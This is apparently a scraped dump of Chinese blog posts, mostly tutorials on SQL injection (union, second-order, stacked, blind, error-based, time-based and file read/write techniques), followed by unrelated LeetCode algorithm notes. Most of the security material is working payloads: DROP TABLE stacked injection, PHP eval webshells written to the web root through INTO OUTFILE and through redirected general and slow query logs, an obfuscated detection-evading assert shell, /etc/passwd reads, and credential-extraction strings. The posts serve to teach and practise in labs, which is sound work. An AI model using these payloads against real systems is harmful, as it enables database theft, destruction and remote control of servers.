\u0026lt;?php $cat = \u0026#34;1 UNION SELECT 1, user, 1, pass FROM users\u0026#34;; ?\u0026gt; 最终执行的SQL语句就是： SELECT id, name, price, dexcription FROM product WHERE category = 1 UNION SELECT 1, user, 1, pass FROM users 要注意的是，拼接的查询语句，所查询的column数量必须与原本的相同，比如原本需要查询usname, passwd两列，那么拼接的查询语句也需要包含两列内容 可以利用 order by 关键词来实现对于列数的测试，同时使用二分法的技巧，直到不再报错为止 ?category=1 order by 100 Second-order injection 二次注入 Second-order injection就像名字所指示的那样，注入的语句会在服务端的SQL代码中，出现两次，因此称为二次注入。 与先前我们提到的注入方法相比，二次注入并不是直接发起注入，而是先将注入的语句存入数据库，再调用该数据的查询，从而完成拼接，实现注入 比如我们想要修改admin用户的密码： 第一次注入： 比如在注册的时候，将想要注入的代码放入用户名中 \u0026lt;?php $user = \u0026#34;admin\u0026#39;--\u0026#34;;?\u0026gt; 也许服务端对于注册部分的变量有严格的审查机制，却忽略了其他SQL语句的审查，那我们此时就得到了一个 admin'-- 的用户 \u0026lt;?php $q = \u0026#34;UPDATE users SET pass=\u0026#39;\u0026#34;.$_POST[\u0026#39;newPass\u0026#39;]. \u0026#34;\u0026#39;WHERE user=\u0026#39;\u0026#34;.$row[\u0026#39;user\u0026#39;].\u0026#34;\u0026#39;\u0026#34;; ?\u0026gt; 接下来触发 UPDATE 操作，这里却没有对数据库中查询到的变量做严格的过滤，导致注入语句拼接成功，我们就可以修改 admin 的密码了 UPDATE users SET pass=\u0026#39;我们想要的值\u0026#39; WHERE user=admin\u0026#39;--\u0026#39; Piggy-backed/Chained 堆叠注入 与 UNION 类似， Piggy-backed/Chained 也是为了执行额外的语句 利用 ; 来增加额外的语句实现 \u0026lt;?php $q = \u0026#34;SELECT id FROM users WHERE user=\u0026#39;\u0026#34;.$user. \u0026#34;\u0026#39; AND pass=\u0026#39;\u0026#34;.$pass.\u0026#34;\u0026#39;\u0026#34;; ?\u0026gt; \u0026lt;?php $user = \u0026#34;\u0026#39;; DROP TABLE users −− \u0026#34;; ?\u0026gt; 最终变成 SELECT id FROM utente WHERE user=\u0026#39;\u0026#39;; DROP TABLE users --\u0026#34;\u0026#39; AND pass=\u0026#39;\u0026#39; Blind injection 详见 SQL注入：盲注 布尔盲注\n布尔Bool，意味着我们在将注入一些布尔逻辑判断，根据逻辑判断的结构来触发页面发生变化，进而判断语句是否成功执行； 例如：如果成功，则页面正常显示；否则就什么都不显示 报错注入\n报错注入是将有价值的信息通过报错的方式显示输出。 这里需要与普通的注入区分一下： 普通的注入是将查询到的信息正常得输出到页面上来 报错注入则是构造特定的MYSQL函数语法错误，同时将所需要的信息拼接到错误返回信息中，然后再返回到页面上来 延时注入\n时间盲注是一种边信道攻击(Side-channel attack SCA)，这原本是密码学的一个概念，这种攻击用于加密算法的破解，它基于密码系统的物理实现而不是加密算法其本身，比如加密所需要的时间，所消耗的电子设备的一切资源，甚至电磁泄露或者声音这些信息来反过来分析算法本身。 个人认为SCA的一个特点，就是要刻意放大一个正常的操作的影响，以此制造明显的特征。 那么在时间盲注中，我们无法像普通注入那样，得到查询的数据，也无法通过布尔盲注或者报错盲注在页面上显示的获得任何信息，而是通过通过判断语句，同时增加成功注入所使用的时间，最后通过判断响应时间的变化来判断是否成功执行。 文件读写注入 详见 SQL注入：文件读写 读\n利用Mysql内置的用于读取文件的函数来读取文件内容 写\n一般的利用就是将一句话木马注入到服务端，然后再用蚁剑等工具连接 其他一些绕过姿势 对MYSQL注入相关内容及部分Trick的归类小结 ","date":"2022-04-24T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/sql_injection_basic/","title":"SQL注入：基础"},{"content":"\u0026lt;!\u0026ndash;more\u0026ndash;\u0026gt;\nSQL注入：文件读写 之前我们的基础注入包括盲注都依赖于HTTP请求的响应，并从其中获取查询结果，报错信息，页面变化，以及响应时间，而这次我们要讲的文件读写则是直接将需要的信息写入文件，或者从文件中读取信息。\n参考：\n对MYSQL注入相关内容及部分Trick的归类小结\n前置知识 Mysql中的读写权限 说到文件读写，那就免不了要提到权限的问题。\nfile_priv 是用户读写文件的权限，可以通过以下payload来查询权限\nselect file_priv from mysql.user where user=$USER AND host=$HOST; SELECT HOST, USER, File_priv from mysql.user; secure-file-priv 是系统变量，用于对文件读写功能进行限制：\n为空，表示无限制 为NULL，表示禁止文件读写 为目录名，表示将文件读写限制在特定目录下 注： 5.5.53 本身及之后的版本默认值为NULL，之前的版本为空\n查看 secure-file-priv 值的方法\nselect @@secure_file_priv; select @@global.secure_file_priv; show variables like \u0026#34;secure_file_priv\u0026#34;; secure_file_priv secure_file_priv= (空格）代表对文件读写没有限制 secure_file_priv=NULL 代表不能进行文件读写 secure_file_priv=d:/… (具体路径) 代表只能对改路径下文件进行读写 修改的方法 :\n通过修改my.ini文件，添加： secure-file-priv=\n启动项添加参数： mysqld.exe --secure-file-priv=\nSELECT .. INTO 语句 Mysql文档：《13.2.9.1 SELECT \u0026hellip; INTO Statement》\nSELECT ... INTO 表达式允许由SELECT语句查询到的结果存储到变量或者文件中：\n写 一般的利用就是将一句话木马注入到服务端，然后再用蚁剑等工具连接：\nselect 1,\u0026#34;\u0026lt;?php @eval($_POST[\u0026#39;t\u0026#39;]);?\u0026gt;\u0026#34; into outfile \u0026#39;/var/www/html/1.php\u0026#39;; select 2,\u0026#34;\u0026lt;?php @assert($_POST[\u0026#39;t\u0026#39;]);?\u0026gt;\u0026#34; into dumpfile \u0026#39;/var/www/html/1.php\u0026#39;; 需要满足的条件 secure-file-priv 为空或为可以利用的目录 需要知道目标文件的绝对路径 目标目录的权限为可写，mysql的权限也足够 因此需要先查看权限是否足够：\nmysql\u0026gt; show variables like \u0026#39;%secure%\u0026#39;; +--------------------------+-------+ | Variable_name | Value | +--------------------------+-------+ | require_secure_transport | OFF | | secure_auth | ON | | secure_file_priv | | +--------------------------+-------+ 3 rows in set (0.02 sec) 日志法 参考\n由于在mysql的5.5.53版本之后， secure-file-priv 的值默认为 NULL (NULL不等于空)，不满足我们所需要的条件（secure-file-priv为空或为可以利用的目录），无法进行正常的读写。\n因此这里我们通过更改日志文件的方法来进行绕过：\nshow variables like \u0026#39;%general%\u0026#39;; #查看日志文件相关配置 set global general_log = on; #开启general log模式 set global general_log_file = \u0026#39;/var/www/html/1.php\u0026#39;; #设置日志目录为我们想要执行的shell地址 select \u0026#39;\u0026lt;?php eval($_POST[cmd]);?\u0026gt;\u0026#39;; #写入shell 新建的1.php文件内容如下：\n/Applications/MAMP/Library/bin/mysqld, Version: 5.7.34 (MySQL Community Server (GPL)). started with: Tcp port: 8889 Unix socket: /Applications/MAMP/tmp/mysql/mysql.sock Time Id Command Argument 2022-10-02T01:43:34.925269Z\t6 Query\tselect \u0026#39;\u0026lt;?php eval($_POST[cmd]);?\u0026gt;\u0026#39; 接下来就可以用蚁剑进行连接了。\nSQL查询免杀shell\nSELECT \u0026#34;\u0026lt;?php $p = array(\u0026#39;f\u0026#39;=\u0026gt;\u0026#39;a\u0026#39;,\u0026#39;pffff\u0026#39;=\u0026gt;\u0026#39;s\u0026#39;,\u0026#39;e\u0026#39;=\u0026gt;\u0026#39;fffff\u0026#39;,\u0026#39;lfaaaa\u0026#39;=\u0026gt;\u0026#39;r\u0026#39;,\u0026#39;nnnnn\u0026#39;=\u0026gt;\u0026#39;t\u0026#39;);$a = array_keys($p);$_=$p[\u0026#39;pffff\u0026#39;].$p[\u0026#39;pffff\u0026#39;].$a[2];$_= \u0026#39;a\u0026#39;.$_.\u0026#39;rt\u0026#39;;$_(base64_decode($_REQUEST[\u0026#39;username\u0026#39;]));?\u0026gt;\u0026#34; # assert($_REQUEST[\u0026#39;username\u0026#39;]) 慢查询日志\nshow variables like \u0026#34;%slow_query_log%\u0026#34;; #查看慢查询日志的相关配置 mysql\u0026gt; set global slow_query_log=on; #开启慢查询日志 mysql\u0026gt; set global slow_query_log_file=\u0026#39;/var/www/html/2.php\u0026#39; #修改慢查询日志文件 SELECt sleep(10) or \u0026#39;\u0026lt;?php eval($_POST[cmd]);?\u0026gt;\u0026#39;; #用一个执行时间很长的SQL语句注入shell语句（没有考证过一般的做法） 接着用蚁剑连接成功。\n慢日志2.php的内容如下：\n/Applications/MAMP/Library/bin/mysqld, Version: 5.7.34 (MySQL Community Server (GPL)). started with: Tcp port: 8889 Unix socket: /Applications/MAMP/tmp/mysql/mysql.sock Time Id Command Argument # Time: 2022-10-02T02:00:08.779509Z # User@Host: root[root] @ localhost [] Id: 6 # Query_time: 10.079524 Lock_time: 0.000000 Rows_sent: 1 Rows_examined: 0 use security; SET timestamp=1664676008; select sleep(10) or \u0026#39;\u0026lt;?php eval($_POST[cmd]);?\u0026gt;\u0026#39;; 慢查询日志（slow_query_log） 当SQL执行的时间超过我们设定的时间，那么这些SQL就会被记录在慢查询日志中 接着就可以用查看慢查询日志，接着使用explain分析这些SQL的执行，接着判定为什么效率低下 需要满足的条件 需要进行日志设置操作的权限 需要目标文件的绝对路径 读 CSS-T | Mysql Client 任意文件读取攻击链拓展\nMysql内置了用于读取文件的函数 load_file() ： select load_file(file_path); Figure 1: load_file\n读取服务端文件，Mysql server读取服务端的 /etc/passwd/ 文件，然后将数据按照 '\\n' 分割 插入test表中，但是受到 secure_file_priv 的限制：\nload data infile \u0026#34;/etc/passwd\u0026#34; into table test FIELDS TERMINATED BY \u0026#39;\\n\u0026#39;; 读取客户端文件，读取客户端的文件，然后发送到客户端：\nload data local infile \u0026#34;/etc/passwd\u0026#34; into table test FIELDS TERMINATED BY \u0026#39;\\n\u0026#39;; 前两种读取服务端文件都需要 secure-file-priv 为空（无值）或者为可利用的目录 都需要知道读取文件所在的绝对路径 读取的文件大小必须小于 max_allowed_packet 所设置的值 Figure 2: max_allowed_packet\n低权限读取文件的方法 我们在前置知识中提到了5.5.53版本之后， secure-file-priv 默认为 NULL 这里给出方法，参考文章提到mysql8测试失败，其他版本自测；\n将想要读取的文件的信息放入表中，然后再读取：\ndrop table mysql.m1; #清空原来可能存在的mysql.m1 CREATE TABLE mysql.m1 (code TEXT ); LOAD DATA LOCAL INFILE \u0026#39;D://1.txt\u0026#39; INTO TABLE mysql.m1 fields terminated by \u0026#39;\u0026#39;; select * from mysql.m1; ","date":"2022-04-02T00:00:00+08:00","permalink":"https://ginkgo.org.cn/posts/sql_injection_file_rw/","title":"SQL注入：文件读写"},{"content":"SQL Injection: Blind injection 对于之前的SQL注入，我们都是通过注入拼接查询语句，来显示地返回数据库，表，列的信息到页面对应的位置，而盲注的特点就在于页面不会返回任何查询到的内容，因此我们只能通过一些标志或者说信号（signal）来得知注入语句是否被执行，以及查询到的数据。\n布尔盲注 布尔Bool，意味着我们在将注入一些布尔逻辑判断，根据逻辑判断的结构来触发页面发生变化，进而判断语句是否成功执行；\n例如：如果成功，则页面正常显示；否则就什么都不显示\n接下来我们来看一些由不同的函数组成的布尔判断\n- left() 通过left来截取字符，然后使用字母表进行逐个比较，如果等式成立，那么页面正常显示;\nLeft()函数 LEFT(str, len) 从给定的字符串str中，返回从左开始的len个字符 如果是是RIGHT就是从由开始截取 如果失败，那么页面就无法正常显示，以此我们就可以推断字符串的内容；\n?id=1\u0026#39; and left(database(), 1)\u0026gt;\u0026#39;a\u0026#39; # database first char match ?id=1\u0026#39; and left(database(), 2)\u0026gt;\u0026#39;se\u0026#39; # database first two chars match 可以先通过length来判断长度，方便进行了解最终需要获得几个字符\n?id=1\u0026#39;and length(database())=8%23 # length match - substr() \u0026amp; ascii() 同样是截取字符，使用substr方法;\n然后通过ascii()方法将char转换成ascii码值(int)值之后进行判断与比较\nsubstr()函数 substr(obj，start，length) 从给定的字符串/数值obj中，以start（从1开始增加）开始，截取length个字符 ascii()函数 ASCII(str) 返回字符串str最左面字符的ASCII码值； 如果为空字符串，则返回0；如果为NULL，返回NULL ascii(substr((select table_name from information_schema.tables where tables_schema=database() limit 0,1),1,1)) = 101 - ORD() and MID() 与substr()和ascii()的组合类似，也是通过MID逐个选取字符，然后使用ORD返回ASCII进行比较\nORD(str) 返回str字符串最左边的第一个字符的code 如果最左边的第一个字符为多字节字符（例如utf-8占3个字节），则结果使用公式计算： (1st byte code)+ (2nd byte code * 256)+ (3rd byte code * 256^2) …… 如果是一个字节的字符，则返回该字符的ASCII码值，结果和ASCII(str)一致 Figure 1: ASCII 与 ORD 方法的区别\nMID(str, pos. len) 从pos开始，str中截取长度为len的substring 其中pos从1开始，也可以为负数表示从末尾开始 ?id=1\u0026#39;and ORD(MID((select IFNULL(CAST(username as char), 0x20) from security.users order by id limit 0,1),1,1))=68 # match username\u0026#39;s first record by IFNULL IFNULL()函数 IFNULL(expression, alt_value) 判断第一个表达式的结果是否为NULL，如果不是NULL则返回其结果； 如果是NULL则返回 alt_value 的结果 - regexp 这次是利用正则表达式来进行比较\n?id=1\u0026#39; and 1=(select 1 from information_schema.columns where table_name=\u0026#39;users\u0026#39; and table_name regexp \u0026#39;^[a-z]\u0026#39; limit 0,1)-- - ?id=1\u0026#39; and 1=(select 1 from information_schema.columns where table_name=\u0026#39;users\u0026#39; and column_name regexp \u0026#39;^username\u0026#39; limit 0,1)-- - - like 匹配注入 通过模糊匹配来进行比较\nselect user() like \u0026#39;ro%\u0026#39; The percent sign (%) represents zero, one, or multiple characters The underscore sign (_) represents one, single character 报错盲注 报错注入是将有价值的信息通过报错的方式显示输出。 这里需要与普通的注入区分一下：\n普通的注入是将查询到的信息返回出来 报错注入是构造特定的MYSQL函数语法错误，同时将所需要的信息拼接到错误返回信息中，然后再返回到页面上来 Figure 2: 报错盲注总结\nBigInt数据类型溢出报错注入 mysql注入入门之报错注入\n利用exp(int)函数，计算e^[int]的值，得到一个很大的数，目的是要造成\u0026quot;DOUBLE value is out of range\u0026quot;的错误 只适用于， mysql版本5.5.5以上的版本\nEXP(X) 计算得到e^X的值 ~ 符号 按位取反 00001001 11110110 ?id=1\u0026#39; and exp(~(select * from (select user())a))-- - 1.先查询select user()这个语句的结果，然后将查询出来的数据作为一个结果集取名为a（临时表取名）； 2.然后在查询select * from a 查询a，将结果集a全部查询出来； 3.查询完成，语句成功执行，返回值为0，将0按位取反（\u0026rsquo;~\u0026rsquo;）就会得到一个 无符号 的最大BIGINT值，从而使exp调用的时候报错。\n获取表名信息\nand exp(~(select * from (select table_name from information_schema.tables where table_schema=database() limit 0,1)a))-- - 获取列名信息\nand exp(~(select * from (select column_name from information_schema.columns where table_name=\u0026#39;users\u0026#39; limit 0,1)a))-- - 获取列名对应的信息\nand exp(~(select * from(select username from users limit 0,1)a))-- - 读取文件\nand exp(~(select * from (select load_file(\u0026#39;/etc/passwd\u0026#39;))a))-- - 注意：对于所有的insert、update和delete语句DIOS查询也同样可以使用 除了exp()函数之外，pow()之类的相似函数同样可以利用BigInt数据溢出的方式进行报错注入\n参数格式错误 参数格式错误旨在使用特殊的函数，这些函数需要参数满足一定的条件，否则将会报出错误的信息；\n我们通过将需要的内容查询之后拼接到报出的错误信息中来实现报错注入：\nupdatexml()\nupdatexml() 函数利用的就是mysql函数参数格式错误进行报错注入\nupdatexml(XML_document,Xpath_string,new_value) : - XML_document:是字符串String格式，为XML文档对象名称 - Xpath_string:Xpath格式的字符串，例如：boostore, bookstore/book, /book, bookstore//book, //@lang, /[/@\\d] - new_value:string格式，替换查找到的符合条件的数据 - 作用是改变文档中符合条件的节点的值 - 适用版本是： Mysql 5.1.5+\n利用方式：\n在执行两个函数时，如果出现xml文件路径错误，就会产生报错；\n那么我们就需要构造Xpath_string格式错误，也就是我们将Xpath_string的值传递成不符合格式的参数，mysql就会报错：\n查询当前数据库的用户信息以及数据库版本信息\n?id=1\u0026#39; and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3)-- - 根据上面对于Xpath_string的定义我们可以得知，当使用类似 0x7e=\u0026rsquo;~\u0026rsquo; 之类的额外字符的时候，会被认定为非Xpath，就会产生报错\n查询当前数据库名称及操作系统版本信息：\n?id=1\u0026#39; and updatexml(1,concat(0x7e,database(),0x7e,@@version_compile_os,0x7e),3)-- - 获取当前数据库下数据表信息：\n?id=1\u0026#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),3)-- - 为啥不可以？\n?id=1\u0026#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),3)-- - 注意 : updatexml最多只能显示32位，需要配合SUBSTR使用\nextractvalue()\nextractvalue(XML_document,XPath_string) : - XML_document:是字符串String格式，为XML文档对象名称 - Xpath_string:Xpath格式的字符串，例如：boostore, bookstore/book, /book, bookstore//book, //@lang, /[/@\\d] - 作用是从目标XML中返回包含所查询值的字符串\n- 适用的版本：5.1.5+ 利用的原理也是xpath格式不符报错注入：\n获取当前是数据库名称及使用mysql数据库的版本信息：\nand extractvalue(1,concat(0x7e,database(),0x7e,version(),0x7e))-- - 获取当前注入点的用户权限信息及操作系统版本信息：\nand extractvalue(1,concat(0x7e,@@version_compile_os,0x7e,user(),0x7e))-- - 获取当前位置所用数据库的位置：\nand extractvalue(1,concat(0x7e,@@datadir,0x7e))-- - 获取数据表信息:\nand extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e))-- - 获取users数据表的列名信息:\nand extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=\u0026#39;users\u0026#39; limit 0,1),0x7e))-- - 获取对应的列名的信息(username\\password):\nand extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e))-- - 主键重复 MySQL floor()报错原理分析\n主键重复无论是理解和解释都比较复杂，我们先给出常用的payload，然后慢慢细说\nselect count(*) from users group by concat(database(),floor(rand(14)*2)); select count(*),concat(database(),floor(rand(14)*2))x from users group by x; 我们使用sali-labs的环境，因此这里的database()的值就是security\n那么以上payload的报错就是：\n我们观察到这里提示有\u0026rsquo;security0\u0026rsquo;主键重复,这里思考几个问题：\nsecurity后面的0是哪里来的？ 主键是哪里来的？ 为什么会发生主键重复？ 为什么rand的seed是14（一般看到的可能就是0） security后面的0是哪里来的？\n通过 floor(rand(14)*2) 构造出来的\nrand([seed]),通过给定不同的seed来返回(0,1)范围中的值，而floor()函数则会将float的值向下取整，因此rand(14)*2∈(0,2)，向下取整就变成了{0,1}，结果就是0或者1\n主键是哪里来的？\n我们这里使用了group by语法，目的是对查询的结果根据给出的字段进行分类，而查询到的结果会放在一个临时表中，我们给出的字段就是这个临时表的主键；\n这里我们使用聚合函数count(*)，用来统计每个主键出现的次数；\n在实际实现的过程中，数据库会首先创建一个空的临时表，包含两个字段：\nkey = concat(database(),floor(rand(14)*2)), 主键，不能重复； count(*) = 主键在原来的users表中出现的次数； key count(*) 为什么会发生主键重复？\n我们接着看，接下来数据库会根据主键逐条查询users表中的内容。\n这里为了得到主键 key 的具体内容方便接下来的查询，进行第一次floor(rand())计算：\n得到 security1 (之前不是说了随机，这里我为什么说就是security1呢，因为实际测试结果就是，第一个生成的数字一定就是1，我认为可能和伪随机机制有关系)\n我们当然知道之后users表里不会有security1这样的字段，同样数据库也找不到\n此时没有发现重复的主键，因此会把主键的值直接插入临时表中，并将count(*)的值增加为1\n此时为了得到需要插入的主键的值，会进行第二次 flood(rand())计算:\n得到的结果为security0（必然发生，理由同上）\nkey count(*) security0 1 继续遍历users表中的第二条数据，计算主键的值，为security1（必然发生，理由同上），同样在users表中也没有找到主键的字段，也没有发现临时表中有重复的主键。\n接着插入主键的值，再次计算，得到security0（必然发生，理由同上）,但是这个时候在插入的时候，就会发生主键冲突而产生报错，因为原本的临时表中已经有一个security0了，同时会把数据库的名字+0拼接在报错信息上\n那么同样的，如果我们选择查询其他的信息来代替这里的database()，那么在报错的时候，就能拼接得到我们想要查询的信息\n为什么将rand的seed设为14？\n大家可能平时看到的都是设为0的，那么这里就给大家看一下两种seed带来不同的效果\nFigure 3: rand()使用不同seed的结果\n大家有看出什么不同的地方吗？\n我们使用users表中的来多次计算flood(rand())的值，来模拟主键重复中多次计算的场景：\n我们发现，在seed为0的时候，伪随机给出的计算结果其顺序为：\nfloor(rand(0)*2) usage query number 0 主键计算 0 1 主键插入 0 1 主键计算 1 0 主键插入 1 1 主键计算 2 1 主键插入，主键重复，报错 2 这里需要至少 三条记录 才能造成主键重复\n那我们再来看seed为14的时候，伪随机给出的顺序为：\nfloor(rand(0)*2) usage query number 1 主键计算 0 0 主键插入 0 1 主键计算 1 0 主键插入，主键重复，报错 1 很明显，只要有两条记录，即可造成报错，因此使用14作为rand()的seed是非常合适的.\n大家可以根据我的sql语句进行尝试，得到的结果顺序应该是一致，这也就回答了为什么我之前提到的明明是随机到的结果，为什么说是必然的到的。\n时间盲注 时间盲注是一种边信道攻击(Side-channel attack SCA)，这原本是密码学的一个概念，这种攻击用于加密算法的破解，它基于密码系统的物理实现而不是加密算法其本身，比如加密所需要的时间，所消耗的电子设备的一切资源，甚至电磁泄露或者声音这些信息来反过来分析算法本身。\n个人认为SCA的一个特点，就是要刻意放大一个正常的操作的影响，以此制造明显的特征。\n那么在时间盲注中，我们无法像普通注入那样，得到查询的数据，也无法通过布尔盲注或者报错盲注在页面上显示的获得任何信息，而是通过通过判断语句，同时增加成功注入所使用的时间，最后通过判断响应时间的变化来判断是否成功执行。\nsleep() IF(condition, true_value, false_value) 如果condition结果为true则返回true_value,反之则返回false_value FIND_IN_SET(str, str_list) 如果str在str_list中，则返回0； 如果str或者str_list其中有一个为NULL，则返回NULL; 如果str_list为空（\u0026quot;\u0026quot;），也返回0; 否则返回0 sleep(duration) 执行该函数回休眠duration秒的时间； 函数的返回值为0 如果实参输入为NULL或者负数，则会出现警告，或者在strict SQL模式下报错 利用if进行判断，如果满足条件，则延迟响应5s\n?id=1\u0026#39; or if(ascii(substr(database(),1,1))\u0026gt;115, sleep(5), 0)-- - //if 判断语句，条件为真， 执行 sleep select sleep(find_in_set(mid(@@version, 1, 1), \u0026#39;0,1,2,3,4,5,6,7,8,9,.\u0026#39;)); 注意这里建议使用 or 比较保险\n如果在测试的时候使用，?id=-1\u0026rsquo; and if\u0026hellip;,由于id=-1本身为False，后面的语句都不会执行（为什么不用1？为了统一习惯吧）\nBenchmark() 利用benchmark函数，对一个操作进行多次的操作来实现延时：\nBENCHMARK(count ,expr) 执行count次expr操作 返回值永远都是0 ?id=1\u0026#39; and if((ascii(substr((select username from users limit 0,1), 1, 1))=68),benchmark(5000000000000000, sha(1),0)-- - Database Expression Mysql BENCHMARK(100000,MD5(1)) or sleep(5) Postgresql PG_SLEEP(5) OR GENERATE_SERIES(1,10000) Ms sql server WAITFOR DELAY ‘0:0:5’ 笛卡尔积（heavy query） Time-Based Blind SQL Injection using Heavy Query\nFROM关键词之后跟多个表，结果就会是不同表的每条记录之间的所有组合：\nfrom 两个表，没有join。是两表自然连接！！！\n因此通过查询多个表合集来造成大量的查询，导致查询时间变长造成延迟\nSELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C; 如果判断的结果为false，则不会执行后面的耗时的查询；\n如果判断的结果为true，则执行后main耗时的查询，发现响应的时间边长，也就知道了判断结果成为true\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39;and ascii(substr((select username from users limit 0, 1),1,1)) \u0026lt; 50 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)-- - GET_LOCK() mysql延时注入_Sql注入的几种有趣操作\nmysql_pconnect(server,user,pwd,clientflag) :\nmysqlp_connect() 函数 打开一个到 MySQL 服务器的持久连接 mysqlpconnect() 和 mysqlconnect() 非常相似，但有两个主要区别： 1、当连接的时候本函数将先尝试寻找一个在同一个主机上用同样的用户名和密码已经打开的(持久)连接， 如果找到，则返回此连接标识而不打开新连接。 2、当脚本执行完毕后到 SQL 服务器的连接不会被关闭，此连接将保持打开以备以后使用 (mysqlclose() 不会关闭由 mysql_pconnect() 建立的连接). get_lock(str,timeout) 打开一个名为str的锁，并且给予timeout作为锁的有效时长； 如果timeout为负数，则表示无限锁住； 当一个session上锁之后，其他的session无法访问； 也就是说此方法只有在数据库的连接是持久连接的时候才能生效 举个例子：\n打开两个mysql的shell; 先在一个shell中执行命令 select getlock(\u0026lsquo;sdpc\u0026rsquo;,5) 先上锁; 然后在另外一个shell中执行重复的命令，第二个shell中便出现延迟，延迟的时间由第二个shell的getlock中的参数决定. 因此在我们写脚本的时候，先加锁，再进行盲注即可(使用requests库时注意加锁和盲注不要在同一个session下)\n正则bug mysql 延时注入新思路\n这是一个老生常谈的问题了，但之前可能很少会把它放到注入里讨论。\n正则匹配在匹配较长字符串但自由度比较高的字符串时，会造成比较大的计算量，我们通过 rpad 或 repeat 构造长字符串，加以计算量大的pattern，通过控制字符串长度我们可以控制延时：\nRPAD(str, len, padstr) 向str右侧重复填充padstr字符串，直到总长度达到len 如果是LPAD就是向左填充 RLIKE pattern 使用pattern中的正则表达式进行匹配 REPEAT(str, count) 返回重复count次的str mysql\u0026gt; select rpad(\u0026#39;a\u0026#39;,4999999,\u0026#39;a\u0026#39;) RLIKE concat(repeat(\u0026#39;(a.*)+\u0026#39;,30),\u0026#39;b\u0026#39;); +-------------------------------------------------------------+ | rpad(\u0026#39;a\u0026#39;,4999999,\u0026#39;a\u0026#39;) RLIKE concat(repeat(\u0026#39;(a.*)+\u0026#39;,30),\u0026#39;b\u0026#39;) | +-------------------------------------------------------------+ | 0 | +-------------------------------------------------------------+ 1 row in set (5.22 sec) ","date":"2022-03-27T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/sqli_blind_injection/","title":"SQL注入：盲注"},{"content":"\u0026lt;!\u0026ndash;more\u0026ndash;\u0026gt;\nLeetBook Basic Algorithm Notes https://leetcode-cn.com/leetbook/read/top-interview-questions-easy/\n删除排序数组中的重复项 解题方法：利用双指针\n解题思路：\n定义两个指针 fast, low,起始分别指向nums[1]， 循环遍历直至最后一个元素，每次判断nums[fast] == [fast-1], 如果不相等，说明当前nums[fast]的值还没有重复，这时nums[low]写入nums[fast]的值（这里不用担心会覆盖没有重复的元素，因为low永远\u0026lt;=fast，当low\u0026lt;fast时说明有重复的元素需要覆盖）； 如果相等，说明重复了，fast自增，low保持不变（这里也可以看出，fast自增后会留下一个重复的元素，可以用于覆盖）。 复杂度： 时间复杂度O(n)：遍历数组 空间复杂度O(1): 原数组进行元素覆盖\n测试用例：\n数组长度为0的情况 数组含有重复元素的情况 数组不含有重复元素的情况 class Solution: def removeDuplicates(self, nums: List[int]) -\u0026gt; int: if not nums: return 0 length = len(nums) fast = slow = 1 while fast \u0026lt; length: if nums[fast] != nums[fast-1]: nums[slow] = nums[fast] slow += 1 fast += 1 return slow 这里我们来拓展一下，如果允许每个元素最多出现两次呢，会有什么变化呢？\n核心思想是要保证 写入的值 ：nums[fast]，在 写入的位置 ：nums[slow]，要和nums[slow-2]的值不一样\n为什么之前要求一个都不重复的时候可以用nums[fast]与nums[fast-1]进行比较，现在却不行了呢？ 因为在之前，nums[fast-1]的位置不可能是更改过的位置，也就是不是nums[slow]的曾经到过的位置，因此不会影响判断； 但是在允许有一个重复的元素的情况下，当前nums[fast]需要与前两位进行对比，那么可能就会存在nums[fast-2]已经做过了修改（因为slow还是自增1的），造成误判\nclass Solution: def removeDuplicates(self, nums: List[int]) -\u0026gt; int: if not nums: return 0 fast = slow = 2 length = len(nums) while fast \u0026lt; length: if nums[fast] != nums[slow - 2]: nums[slow] = nums[fast] slow += 1 fast += 1 return slow 那么我们再扩展允许到n个元素重复 核心思想是要保证 写入的值 ：nums[fast]，在 写入的位置 ：nums[slow]，要和nums[slow-k]的值不一样\nclass Solution: def removeDuplicates(self, nums: List[int]) -\u0026gt; int: if not nums: return 0 def expand(duplicates: int): fast = slow = duplicates length = len(nums) while fast \u0026lt; length: if nums[fast] != nums[slow - duplicates]: nums[slow] = nums[fast] slow += 1 fast += 1 return slow return expand(2) 买卖股票的最佳时机 II 解题思路：使用贪心算法，即在跌之前卖出即可取得利益最大化\n我们先来根据题目实际情况明确几个概念\n单个交易日 只能持有一份股票\n可以执行的操作\n卖出 卖出后买入 买入后立即卖出 操作原则\n如果明天股价 跌了, 立即卖出，结束交易日\n如果明天股价 涨了, 最后买入今天的股票，等待明天卖掉\n根据以上的原则，如果碰到连续上涨日\ntmp_profit = (p_2 - p_1) + (p_3 - p_2) + (p_n - p_n-1) = p_n - p_1， 仍然可以获取最大利益\n算法逻辑：\n计算今日（prices[i]）与前一日（prices[i-1]）的价格差值 如果差值\u0026gt;0，表示赚了，计入profit 如果差值\u0026lt;0或者=0，表示没有赚，跳过不计入profit class Solution: def maxProfit(self, prices: List[int]) -\u0026gt; int: if not prices: return 0 profit = 0 for i in range(1, len(prices)): tmp = prices[i] - prices[i-1] if tmp \u0026gt; 0: profit += tmp return profit 只出现一次的数字 官方解法\nclass Solution: def singleNumber(self, nums: List[int]) -\u0026gt; int: # tempSet = set() # for i in range(len(nums)): # oldLen = len(tempSet) # tempSet.add(nums[i]) # if len(tempSet) == oldLen: # tempSet.remove(nums[i]) # return tempSet.pop() return reduce(lambda x,y:x^y, nums) 算法思路：\n已知列表中除了目标元素外均重复两次 那么直接使用XOR运算，就可以抵消所有的重复元素 例如：1⊕2⊕1⊕2⊕4 = 4\n接着再加上reduce方法来简化代码，一行完成！\nPython reduce() 函数 reduce(function, iterable[, initializer]) function \u0026ndash; 函数，有两个参数 iterable \u0026ndash; 可迭代对象 initializer \u0026ndash; 可选，初始参数\n对于所有iterable中的元素， 两两 作为function的参数执行操作\nfrom functools import reduce def add(x, y) : # 两数相加 return x + y sum1 = reduce(add, [1,2,3,4,5]) # 计算列表和：1+2+3+4+5 sum2 = reduce(lambda x, y: x+y, [1,2,3,4,5]) # 使用 lambda 匿名函数 print(sum1) print(sum2) 